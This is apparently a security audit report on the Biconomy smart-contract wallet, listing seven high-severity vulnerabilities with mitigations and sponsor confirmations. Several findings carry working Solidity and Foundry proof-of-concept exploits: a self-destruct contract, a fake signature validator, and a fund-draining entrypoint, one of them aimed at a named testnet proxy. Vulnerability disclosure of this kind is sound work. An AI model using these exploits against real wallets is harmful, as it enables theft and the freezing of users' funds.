@@ -1,0 +1,149 @@
+[H-01] Destruction of theSmartAccountimplementation
+Submitted byV_B, also found bygogo,gogo,adriro,smit_rajput,Koolex,hihen,spacelord47,0xdeadbeef0x,Matin,chaduke,jonatascm,ro,taek,HE1M, andkankodu
+contracts/smart-contract-wallet/SmartAccount.sol#L166contracts/smart-contract-wallet/SmartAccount.sol#L192contracts/smart-contract-wallet/SmartAccount.sol#L229contracts/smart-contract-wallet/base/Executor.sol#L23
+If theSmartAccountimplementation contract is not initialized, it can be destroyed using the following attack scenario:
+Initialize theSmartAccountimplementationcontract using theinitfunction.Execute a transaction that contains a singledelegatecallto a contract that executes theselfdestructopcode on any incoming call, such as:
+contractDestructor{fallback()external{selfdestruct(payable(0));}}
+The destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as theSingletonfunctionality and the entire contract would be destroyed, leaving only the functionality from the Proxy contract accessible.
+In the deploy script there is the following logic:
+constSmartWallet=awaitethers.getContractFactory("SmartAccount");constbaseImpl=awaitSmartWallet.deploy();awaitbaseImpl.deployed();console.log("base wallet impl deployed at: ",baseImpl.address);
+So, in the deploy script there is no enforce that theSmartAccountcontract implementation was initialized.
+The same situation inscw-contracts/scripts/wallet-factory.deploy.tsscript.
+Please note, that in case only the possibility of initialization of theSmartAccountimplementation will be banned it will be possible to use this attack. This is so because in such a caseownervariable will be equal to zero and it will be easy to pass a check inside ofcheckSignaturesfunction using the fact that for incorrect input parametersecrecoverreturns a zero address.
+Impact
+Complete freezing of all functionality of all wallets (including complete funds freezing).
+Recommended Mitigation Steps
+Add to the deploy script initialization of theSmartAccountimplementation, or add to theSmartAccountcontract the following constructor that will prevent implementation contract from the initialization:
+// Constructor ensures that this implementation contract can not be initializedconstructor()public{owner=address(1);}
+gzeon (judge) commented:
+#14also notes that if owner is left to address(0) some validation can be bypassed.
+livingrockrises (Biconomy) confirmed
+
+[H-02] Theft of funds under relaying the transaction
+Submitted byV_B, also found byDevTimSch
+contracts/smart-contract-wallet/SmartAccount.sol#L200contracts/smart-contract-wallet/SmartAccount.sol#L239contracts/smart-contract-wallet/SmartAccount.sol#L248
+TheexecTransactionfunction is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, thestartGasvalue is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of21000gas and the cost per calldata byte ofmsg.data.length * 8gas. At the end of the function, the total consumed gas is calculated asgasleft() - startGasand the appropriate refund is sent to the relayer.
+An attacker could manipulate the calldata to increase the refund amount while spending less gas than what is calculated by the contract. To do this, the attacker could provide calldata with zero padded bytes of arbitrary length. This would only cost 4 gas per zero byte, but the refund would be calculated as 8 gas per calldata byte. As a result, the refund amount would be higher than the gas amount spent by the relayer.
+Attack Scenario
+Let’s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to theSmartAccountcontract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end.
+So, the original transaction has such calldata:
+abi.encodeWithSignature(RelayerManager.execute.selector, (...))
+The modified (frontrun) transaction calldata:
+// Basically, just add zero bytes at the endabi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[]
+Proof of Concept
+The PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100_000 meaningless zeroes bytes, that gives a100_000 * 4 = 400_000additional gas refund. Technically, it is possible to pass even more zero bytes.
+pragmasolidity^0.8.12;contractDummySmartWallet{functionexecTransaction(Transactionmemory_tx,uint256batchId,FeeRefundmemoryrefundInfo,bytesmemorysignatures)external{// Do nothing, just test that data with appended zero bytes are accepted by Solidity}}contractPoC{addressimmutablesmartWallet;constructor() {smartWallet=address(newDummySmartWallet());}// Successfully call with original datafunctiontestWithOriginalData()external{bytesmemorytxCalldata=_getOriginalTxCalldata();(boolsuccess, ) =smartWallet.call(txCalldata);require(success);}// Successfully call with original data + padded zero bytesfunctiontestWithModifiedData()external{bytesmemoryoriginalTxCalldata=_getOriginalTxCalldata();bytesmemoryzeroBytes=newbytes(100000);bytesmemorytxCalldata=abi.encodePacked(originalTxCalldata,zeroBytes);(boolsuccess, ) =smartWallet.call(txCalldata);require(success);}function_getOriginalTxCalldata()internalpurereturns(bytesmemory) {Transactionmemorytransaction;FeeRefundmemoryrefundInfo;bytesmemorysignatures;returnabi.encodeWithSelector(DummySmartWallet.execTransaction.selector,transaction,uint256(0),refundInfo,signatures);}}
+Impact
+An attacker to manipulate the gas refund amount to be higher than the gas amount spent, potentially leading to arbitrary big ether loses by a smart wallet.
+Recommended Mitigation Steps
+You can calculate the number of bytes used by the relayer as a sum per input parameter. Then an attacker won’t have the advantage of providing non-standard ABI encoding for the PoC calldata.
+// Sum the length of each  bynamic and static length parameters.uint256 expectedNumberOfBytes = _tx.data.length + signatures.length + 12 * 32;uint256 dataLen = Math.min(msg.data.length, expectedNumberOfBytes);
+Please note, the length of thesignaturemust also be bounded to eliminate the possibility to put meaningless zeroes there.
+livingrockrises (Biconomy) confirmed
+
+[H-03] Attacker can gain control of counterfactual wallet
+Submitted byadriro, also found by0x73696d616f,giovannidisiena,Qeew,V_B,0x1f8b,adriro,ey88,wait,Haipls,betweenETHlines,Lirios,hihen,hihen,horsefacts,bin2chen,ast3ros,aviggiano,0xdeadbeef0x,chaduke,Jayus,ladboy233,ladboy233,zaskoh,Kalzak,dragotanqueray,BClabs, andHE1M
+A counterfactual wallet can be used by pre-generating its address using theSmartAccountFactory.getAddressForCounterfactualWalletfunction. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.
+However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:
+https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45
+functiondeployCounterFactualWallet(address_owner,address_entryPoint,address_handler,uint_index)publicreturns(addressproxy){bytes32salt=keccak256(abi.encodePacked(_owner,address(uint160(_index))));bytesmemorydeploymentData=abi.encodePacked(type(Proxy).creationCode,uint(uint160(_defaultImpl)));// solhint-disable-next-line no-inline-assemblyassembly{proxy :=create2(0x0,add(0x20,deploymentData),mload(deploymentData),salt)}require(address(proxy) !=address(0),"Create2 call failed");// EOA + Version trackingemitSmartAccountCreated(proxy,_defaultImpl,_owner,VERSION,_index);BaseSmartAccount(proxy).init(_owner,_entryPoint,_handler);isAccountExist[proxy] =true;}
+As the entrypoint address doesn’t take any role in the address generation (it isn’t part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.
+Impact
+After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (usingdelegatecall) using theexecFromEntryPointfunction:
+https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492
+functionexecFromEntryPoint(addressdest,uintvalue,bytescalldatafunc, Enum.Operationoperation,uint256gasLimit)externalonlyEntryPointreturns(boolsuccess) {success=execute(dest,value,func,operation,gasLimit);require(success,"Userop Failed");}
+This means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.
+Proof of Concept
+In the following test, the attacker deploys the counterfactual wallet using theStealEntryPointcontract as the entrypoint, which is then used to steal any funds present in the wallet.
+contractStealEntryPoint{functionsteal(SmartAccountwallet)public{uint256balance=address(wallet).balance;wallet.execFromEntryPoint(msg.sender,// address destbalance,// uint value"",// bytes calldata funcEnum.Operation.Call,// Enum.Operation operationgasleft()// uint256 gasLimit);}}contractAuditTestisTest{bytes32internalconstantACCOUNT_TX_TYPEHASH=0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;uint256bobPrivateKey=0x123;uint256attackerPrivateKey=0x456;addressdeployer;addressbob;addressattacker;addressentrypoint;addresshandler;SmartAccountpublicimplementation;SmartAccountFactorypublicfactory;MockTokenpublictoken;functionsetUp()public{deployer=makeAddr("deployer");bob=vm.addr(bobPrivateKey);attacker=vm.addr(attackerPrivateKey);entrypoint=makeAddr("entrypoint");handler=makeAddr("handler");vm.label(deployer,"deployer");vm.label(bob,"bob");vm.label(attacker,"attacker");vm.startPrank(deployer);implementation=newSmartAccount();factory=newSmartAccountFactory(address(implementation));token=newMockToken();vm.stopPrank();}functiontest_SmartAccountFactory_StealCounterfactualWallet()public{uint256index=0;addresscounterfactualWallet=factory.getAddressForCounterfactualWallet(bob,index);// Simulate Bob sends 1 ETH to the walletuint256amount=1ether;vm.deal(counterfactualWallet,amount);// Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)vm.startPrank(attacker);StealEntryPointstealer=newStealEntryPoint();addressproxy=factory.deployCounterFactualWallet(bob,address(stealer),handler,index);SmartAccountwallet=SmartAccount(payable(proxy));// address is the sameassertEq(address(wallet),counterfactualWallet);// trigger attackstealer.steal(wallet);vm.stopPrank();// Attacker has stolen the fundsassertEq(address(wallet).balance,0);assertEq(attacker.balance,amount);}}
+Recommended Mitigation Steps
+This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.
+gzeon (judge) commented:
+#278also described a way to make the user tx not revert by self destructing with another call. i.e.Frontrun deploySet approval and selfdestructUser deploy, no revert
+livingrockrises (Biconomy) confirmed
+
+[H-04] Arbitrary transactions possible due to insufficient signature validation
+Submitted by0xdeadbeef0x, also found byV_B,gogo,gogo,Fon,adriro,Tricko,immeas,Haipls,ayeslick,wait,Lirios,Koolex,Atarpara,bin2chen,hihen,ast3ros,wallstreetvilkas,romand,ladboy233,ro,BClabs,StErMi,static,Manboy,csanuragjain, andkankodu
+A hacker can create arbitrary transaction through the smart wallet by evading signature validation.
+Major impacts:
+Stealallfunds from the smart wallet and destroy the proxyLock the wallet from EOAs by updating the implementation contractNew implementation can transfer all funds or hold some kind of ransomNew implementation can take time to unstake funds from protocols
+Proof of Concept
+The protocol supports contract signed transactions (eip-1271). The support is implemented in thecheckSignaturecall when providing a transaction:contracts/smart-contract-wallet/SmartAccount.sol#L218contracts/smart-contract-wallet/SmartAccount.sol#L342
+function execTransaction(Transaction memory _tx,uint256 batchId,FeeRefund memory refundInfo,bytes memory signatures) public payable virtual override returns (bool success) {---------checkSignatures(txHash, txHashData, signatures);}---------success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);---------}}function checkSignatures(bytes32 dataHash,bytes memory data,bytes memory signatures) public view virtual {----------if(v == 0) {----------_signer = address(uint160(uint256(r)));----------require(uint256(s) >= uint256(1) * 65, "BSA021");----------require(uint256(s) + 32 <= signatures.length, "BSA022");-----------assembly {contractSignatureLen := mload(add(add(signatures, s), 0x20))}require(uint256(s) + 32 + contractSignatureLen <= signatures.length, "BSA023");-----------require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, "BSA024");-----------}
+checkSignatureDOES NOTValidate that the_signeror caller is the owner of the contract.
+A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled_signerthat always returnEIP1271_MAGIC_VALUEfrom theisValidSignaturefunction.
+AsisValidSignaturereturnsEIP1271_MAGIC_VALUEand passed the requirements, the functioncheckSignaturesreturns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.
+Impact #1 - Self destruct and steal all funds
+Consider the following scenario:
+Hacker createsFakeSignerthat always returnsEIP1271_MAGIC_VALUEHacker createsSelfDestructingContractthatselfdestructs when calledHacker calls the smart walletsexecTransactionfunctionThe transaction set will delegatecall to theSelfDestructingContractfunction toselfdestructThe signature is crafted to validate against hacker controlledFakeSignerthat always returnsEIP1271_MAGIC_VALUEProxy contract is destroyedHacker received all funds that were in the wallet
+Impact #2 - Update implementation and lock out EOA
+Hacker createsFakeSignerthat always returnsEIP1271_MAGIC_VALUEHacker createsMaliciousImplementationthat is fully controlledONLYby the hackerHacker calls the smart walletsexecTransactionfunctionThe transaction set will call to the the contractsupdateImplementationfunction to update the implementation toMaliciousImplementation. This is possible becauseupdateImplementationpermits being called fromaddress(this)The signature is crafted to validate against hacker controlledFakeSignerthat always returnsEIP1271_MAGIC_VALUEImplementation was updated toMaliciousImplementationHacker transfers all native and ERC20 tokens to himselfHacker unstakes EOA funds from protocolsHacker might try to ransom the protocol/EOAs to return to previous implementationProxy cannot be redeployed for the existing EOA
+Foundry POC
+The POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.
+The POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.
+The POC use a smart wallet proxy contract that is deployed ongoerlichain:proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09
+You will need to install a foundry. Please follow these instruction for the setup:https://book.getfoundry.sh/getting-started/installation
+After installing, create a workdir by issuing the command:forge init --no-commit
+Create the following file intest/DestroyWalletAndStealFunds.t.sol:
+// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import "forge-std/Test.sol";contract Enum {enum Operation {Call, DelegateCall}}interface SmartAccount {function execTransaction(Transaction memory _tx,uint256 batchId,FeeRefund memory refundInfo,bytes memory signatures) external payable returns (bool success);function getNonce(uint256 batchId) external view returns (uint256);}struct Transaction {address to;uint256 value;bytes data;Enum.Operation operation;uint256 targetTxGas;}struct FeeRefund {uint256 baseGas;uint256 gasPrice; //gasPrice or tokenGasPriceuint256 tokenGasPriceFactor;address gasToken;address payable refundReceiver;}contract FakeSigner {bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;// Always return valid EIP1271_MAGIC_VALUEfunction isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {return EIP1271_MAGIC_VALUE;}}contract SelfDestructingContract {// All this does is self destruct and send funds to "to"function selfDestruct(address to) external {selfdestruct(payable(to));}}contract DestroyWalletAndStealFunds is Test {SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);address hacker = vm.addr(0x1337);SelfDestructingContract sdc;FakeSigner fs;function setUp() public {// Create self destruct contractsdc = new SelfDestructingContract();// Create fake signerfs = new FakeSigner();// Impersonate hackervm.startPrank(hacker);// Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hackerbytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);// Create transaction specifing SelfDestructingContract as target and as a delegate callTransaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);// Create FeeRefundFeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));// Add fake signature (r,s,v) to pass all requirments.// v=0 to indicate eip-1271 signer "fakeSignerPadded" which will always return truebytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));// Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.proxySmartAccount.execTransaction(transaction, 0, fr, signatures);vm.stopPrank();}function testProxyDoesNotExist() public {uint size;// Validate that bytecode size of the proxy contract is 0 becuase of self destructaddress proxy = address(proxySmartAccount);assembly {size := extcodesize(proxy)}assertEq(size,0);}function testRevertWhenCallingWalletThroughProxy() public {// Revert when trying to call a function in the proxyproxySmartAccount.getNonce(0);}}
+To run the POC and validate that the proxy does not exist after destruction:
+forge test -m testProxyDoesNotExist -v --fork-url="<GOERLI FORK RPC>"
+Expected output:
+Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds[PASS] testProxyDoesNotExist() (gas: 4976)Test result: ok. 1 passed; 0 failed; finished in 4.51s
+To run the POC and validate that the EOA cannot interact with the wallet after destruction:
+forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url="<GOERLI FORK RPC>"
+Expected output:
+Failing tests:Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds[FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092)
+Tools Used
+Foundry, VS Code
+Recommended Mitigation Steps
+The protocol should validate before callingisValidSignaturethat_signerisowner.
+livingrockrises (Biconomy) confirmed
+
+[H-05] Paymaster ETH can be drained with malicious sender
+Submitted bytaek
+contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111
+Paymaster’s signature can be replayed to drain their deposits.
+Proof of Concept
+Scenario :
+user A is happy with biconomy and behaves well biconomy gives some sponsored tx using verifyingPaymaster — let’s say paymaster’s signature as sig Xuser A becomes not happy with biconomy for some reason and A wants to attack biconomyuser A delegate calls to Upgrader and upgrade it’s sender contract to MaliciousAccount.solMaliciousAccount.sol does not check any nonce and everything else is same to SmartAccount(but they can also add some other details to amplify the attack, but let’s just stick it this way)user A uses sig X(the one that used before) to initiate the same tx over and overuser A earnes nearly nothing but paymaster will get their deposits drained
+files : Upgrader.sol, MaliciousAccount.sol, test filehttps://gist.github.com/leekt/d8fb59f448e10aeceafbd2306aceaab2
+Tools Used
+hardhat test, verified with livingrock
+Recommended Mitigation Steps
+SincevalidatePaymasterUserOpfunction is not limited to view function in erc4337 spec, add simple boolean data for mapping if hash is used or not
+mapping(bytes32 => boolean) public usedHashfunction validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)external override returns (bytes memory context, uint256 deadline) {(requiredPreFund);bytes32 hash = getHash(userOp);require(!usedHash[hash], "used hash");usedHash[hash] = true;
+livingrockrises (Biconomy) confirmed, but commented:
+Unhappy with the recommendation.
+
+[H-06]FeeRefund.tokenGasPriceFactoris not included in signed transaction data allowing the submitter to steal funds
+Submitted byRuhum, also found byV_B,adriro,immeas,supernova,MalfurionWhitehat,cccz, andladboy233
+contracts/smart-contract-wallet/SmartAccount.sol#L288contracts/smart-contract-wallet/SmartAccount.sol#L429-L444
+The submitter of a transaction is paid back the transaction’s gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) \* gasPrice / tokenGasPriceFactor$.baseGas,gasPrice, andtokenGasPriceFactorare values specified by the tx submitter. Since you don’t want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, thetokenGasPriceFactorvalue is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ fortokenGasPriceFactor. That way they can increase the actual gas repayment and steal the user’s funds.
+Proof of Concept
+InencodeTransactionData()we can see thattokenGasPriceFactoris not included:
+functionencodeTransactionData(Transactionmemory_tx,FeeRefundmemoryrefundInfo,uint256_nonce)publicviewreturns(bytesmemory) {bytes32safeTxHash=keccak256(abi.encode(ACCOUNT_TX_TYPEHASH,_tx.to,_tx.value,keccak256(_tx.data),_tx.operation,_tx.targetTxGas,refundInfo.baseGas,refundInfo.gasPrice,refundInfo.gasToken,refundInfo.refundReceiver,_nonce));returnabi.encodePacked(bytes1(0x19),bytes1(0x01),domainSeparator(),safeTxHash);}
+The value is used to determine the gas repayment inhandlePayment()andhandlePaymentRevert():
+functionhandlePayment(uint256gasUsed,uint256baseGas,uint256gasPrice,uint256tokenGasPriceFactor,addressgasToken,addresspayablerefundReceiver)privatenonReentrantreturns(uint256payment) {// uint256 startGas = gasleft();// solhint-disable-next-line avoid-tx-originaddresspayablereceiver=refundReceiver==address(0) ?payable(tx.origin) :refundReceiver;if(gasToken==address(0)) {// For ETH we will only adjust the gas price to not be higher than the actual used gas pricepayment= (gasUsed+baseGas) * (gasPrice<tx.gasprice?gasPrice:tx.gasprice);(boolsuccess,) =receiver.call{value:payment}("");require(success,"BSA011");}else{payment= (gasUsed+baseGas) * (gasPrice) / (tokenGasPriceFactor);require(transferToken(gasToken,receiver,payment),"BSA012");}// uint256 requiredGas = startGas - gasleft();//console.log("hp %s", requiredGas);}
+That’s called at the end ofexecTransaction():
+if(refundInfo.gasPrice>0) {//console.log("sent %s", startGas - gasleft());// extraGas = gasleft();payment=handlePayment(startGas-gasleft(),refundInfo.baseGas,refundInfo.gasPrice,refundInfo.tokenGasPriceFactor,refundInfo.gasToken,refundInfo.refundReceiver);emitWalletHandlePayment(txHash,payment);}
+As an example, given that:
+gasUsed = 1,000,000baseGas = 100,000gasPrice = 10,000,000,000(10 gwei)tokenGasPriceFactor = 18
+You get $(1,000,000 + 100,000) \* 10,000,000,000 / 18 = 6.1111111e14$. If the submitter executes the transaction withtokenGasPriceFactor = 1they get $1.1e16$ instead, i.e. 18 times more.
+Recommended Mitigation Steps
+tokenGasPriceFactorshould be included in the encoded transaction data and thus verified by the user’s signature.
+livingrockrises (Biconomy) confirmed
+
+[H-07] Replay attack (EIP712 signed transaction)
+Submitted byTointer, also found byV_B,Tricko,Haipls,Koolex,peakbolt,0xdeadbeef0x,PwnedNoMore,romand,ro,csanuragjain,HE1M,taek, andorion
+contracts/smart-contract-wallet/SmartAccount.sol#L212
+Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never disappears.
+Why it is possible
+Contract checksnonces[batchId]but notbatchIditself, so we could reuse other batches nounces. If before transaction we havenbatches with the same nonce as transaction batch, then transaction can be replayedntimes. Since there are 2^256batchIds with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.
+Proof of Concept
+Insert this test intestGroup1.tsright afterShould set the correct states on proxytest:
+it("replay EIP712 sign transaction", async function () {await token.connect(accounts[0]).transfer(userSCW.address, ethers.utils.parseEther("100"));const safeTx: SafeTransaction = buildSafeTransaction({to: token.address,data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),nonce: await userSCW.getNonce(0),});const chainId = await userSCW.getChainId();const { signer, data } = await safeSignTypedData(accounts[0],userSCW,safeTx,chainId);const transaction: Transaction = {to: safeTx.to,value: safeTx.value,data: safeTx.data,operation: safeTx.operation,targetTxGas: safeTx.targetTxGas,};const refundInfo: FeeRefund = {baseGas: safeTx.baseGas,gasPrice: safeTx.gasPrice,tokenGasPriceFactor: safeTx.tokenGasPriceFactor,gasToken: safeTx.gasToken,refundReceiver: safeTx.refundReceiver,};let signature = "0x";signature += data.slice(2);await expect(userSCW.connect(accounts[2]).execTransaction(transaction,0, // batchIdrefundInfo,signature)).to.emit(userSCW, "ExecutionSuccess");//contract checks nonces[batchId] but not batchId itself//so we can change batchId to the one that have the same nonce//this would replay transactionawait expect(userSCW.connect(accounts[2]).execTransaction(transaction,1, // changed batchIdrefundInfo,signature)).to.emit(userSCW, "ExecutionSuccess");//charlie would have 20 tokens after thisexpect(await token.balanceOf(charlie)).to.equal(ethers.utils.parseEther("20"));});
+Recommended Mitigation Steps
+AddbatchIdto the hash calculation of the transaction inencodeTransactionDatafunction.
+livingrockrises (Biconomy) confirmed
+
